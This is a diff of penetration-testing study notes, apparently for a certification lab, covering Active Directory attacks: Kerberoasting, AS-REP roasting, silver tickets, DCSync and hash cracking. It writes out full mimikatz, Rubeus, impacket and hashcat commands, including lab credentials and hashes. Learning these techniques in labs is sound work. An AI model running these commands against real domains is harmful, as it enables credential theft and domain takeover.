@@ -1156,7 +1156,7 @@ Login to DC
   - Upload the audit_xxx.zip http://127.0.0.1:8080/ui/administration/file-ingest (delete from database management first)  
 
 # Active directory authentication attack   
-- Cached AD credentials
+- 👥 Cached AD credentials
   - **Local admin (jeff)** on **client75**  
     `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.200.75 /cert:ignore /drive:share,/home/kali/share`
   - start mimikatz with admin mode and dump credentials
@@ -1177,7 +1177,7 @@ Login to DC
   - crack the hash **1000 hashes.ntlm**
     ```
     nano hashes.txt (only NTLM value)
-    hashcat -m 1000 hashes.ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force     
+    hashcat -m 1000 hash.ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force     
     ```
 - Password spray & authentication checks
   - check password policy
@@ -1201,8 +1201,8 @@ Login to DC
     `Get-NetUser -SPN | select samaccountname,serviceprincipalname`
   - Requests service tickets (TGS) for all service account    
     `PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast`  
-  - crack the hash **13100 hashes.kerberoast**  
-    `kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+  - crack the hash **13100 hash.kerberoast**  
+    `kali@kali:~$ sudo hashcat -m 13100 hash.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
   - Alternate tool - impacket-GetUserSPNs  
     `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
   - Python  
@@ -1218,14 +1218,36 @@ Login to DC
     ```
   - using 'pete' credential to request AS-REP hashes for 'dave'  
     `kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.188.70  -request -outputfile hashes.asreproast corp.com/pete`  
-  - crack the hash **18200 hashes.asreproast**  
-    `kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+  - crack the hash **18200 hash.asreproast**  
+    `kali@kali:~$ sudo hashcat -m 18200 hash.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
   - Alternate tool - Rubeus  
     `PS C:\Tools> .\Rubeus.exe asreproast /nowrap`
   - Python  
     `kali@kali:~$ GetNPUsers.py -usersfile usernames.txt -dc-ip 192.168.188.70 -format hashcat -outputfile hashes.asreproast corp.com/`  
-- Silver tickets (Forge service tickets)
-- Domain controller synchonization  
+- 👥 Silver tickets (Forge service tickets)
+  - 🔒 Goal: Access a specific service on a host using a forged Kerberos service ticket (TGS).
+  - connecting to **CLIENT75** via RDP as **jeff**   
+  - Local admin use Mimikatz to retrieve the **SPN password hash** of 'iis_service'
+    `mimikatz # "privilege::debug" "sekurlsa::logonpasswords" exit`  #4d28cf5252d39971419580a51484ca09
+  - Retrieve **Domain SID** for current user
+    `whoami /user whoami /user` #S-1-5-21-1987370270-658905905-1781884369-1105
+  - Retrieve **target SPN**: WEB04  
+  - Forge service ticket with user jeffadmin
+    `mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin`
+  - Listing Kerberos tickets
+    `PS C:\Tools> klist` #jeffadmin
+  - Access the SMB share with the silver ticket
+    `PS C:\Tools> iwr -UseDefaultCredentials http://web04`  
+- 👥 DCSync attack
+  - 🔒 Goal: Retrieve NTLM / Kerberos password hashes of domain users without touching the DC database. Required domain admin (DC01 to get all user hashes) or Replicating Directory Changes (RDC) right.  
+  - connecting to **CLIENT75** as **jeffadmin**
+  - Obtain credentials of dave and administrator
+    `mimikatz # "privilege::debug" "lsadump::dcsync /user:corp\dave" exit`  
+  - crack the hash **1000 hash.dcsync**
+    `hashcat -m 1000 hash.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` #Flowers1
+  - Alternate tool - secretsdump
+    `kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`  
+  - dd
 
 # Lateral movement  
 1. DC1 --> MS02
@@ -1242,7 +1264,7 @@ Login to DC
    - Silver Ticket (Forge Kerberos ticket)  
 
 **Out of scope**
-- Golden ticket
+- 👥 Golden ticket
   Pre-requisites: DC privileges, NTLM hash of krbtgt, Domain SID  
   Note: PsExec connects via hostname  
   1. From compromised CLIENT74 workstation (jen） attempt lateral movement
